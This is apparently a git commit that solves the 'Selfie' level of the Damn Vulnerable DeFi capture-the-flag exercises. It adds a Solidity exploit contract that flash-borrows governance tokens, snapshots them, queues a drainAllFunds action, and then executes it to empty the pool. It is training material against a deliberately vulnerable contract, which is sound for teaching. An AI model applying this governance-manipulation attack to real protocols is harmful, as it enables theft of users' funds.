46fbf763f8b9b7add6b018e4be9d92b1a74c4cfe
root <root@BARTEK-PC>
2023-12-12 06:41:58 +0100

    selfie

--- test/Levels/selfie/Selfie.t.sol
+++ test/Levels/selfie/Selfie.t.sol
@@ -31,10 +31,7 @@ contract Selfie is Test {
         simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
         vm.label(address(simpleGovernance), "Simple Governance");
 
-        selfiePool = new SelfiePool(
-            address(dvtSnapshot),
-            address(simpleGovernance)
-        );
+        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));
 
         dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);
 
@@ -46,8 +43,28 @@ contract Selfie is Test {
     function testExploit() public {
         /**
          * EXPLOIT START *
+         *      Steal all 1.5mln DVT, I have no tokens.
+         *      Probably some governance manipulation is needed.
+         *
+         *      Could I flashloan Governance Tokens, execute drain all funds and return them back?
+         *      Not really, `token` is set in the constructor
+         *      Apparently `token` is actually THE DVT token, so it's the governance token.
+         *
+         *      How to pass onlyGovernance modifier? => call queueAction from SimpleGovernance with function
+         *      signature drainAllFunds(address) as data. Then call executeAction with actionId after 2 days.
+         *      call attack with borrowAmount = 1.5mln
+         *      automatic call to receiveTokens
+         *      warp 2 days
+         *      call executeAction with actionId
          */
+        vm.startPrank(attacker);
+        Hack hack = new Hack(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
 
+        hack.attack(TOKENS_IN_POOL);
+
+        vm.warp(3 days);
+        simpleGovernance.executeAction(1);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -59,5 +76,36 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract Hack {
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableTokenSnapshot dvt;
+    DamnValuableTokenSnapshot internal dvtSnapshot;
+    uint256 actionId;
+    address immutable i_owner;
+
+    constructor(address poolAddress, address governanceAddress, address dvtSnapshotAddress) {
+        pool = SelfiePool(poolAddress);
+        governance = SimpleGovernance(governanceAddress);
+        dvtSnapshot = DamnValuableTokenSnapshot(dvtSnapshotAddress);
+        i_owner = msg.sender;
+    }
+
+    function attack(uint256 borrowAmount) external {
+        pool.flashLoan(borrowAmount);
+    }
+
+    function receiveTokens(address token, uint256 borrowAmount) external {
+        dvtSnapshot.snapshot();
+        actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", i_owner), 0);
+
+        dvtSnapshot.transfer(address(pool), borrowAmount);
+    }
+
+    function executeAction() external {
+        governance.executeAction(actionId);
     }
 }
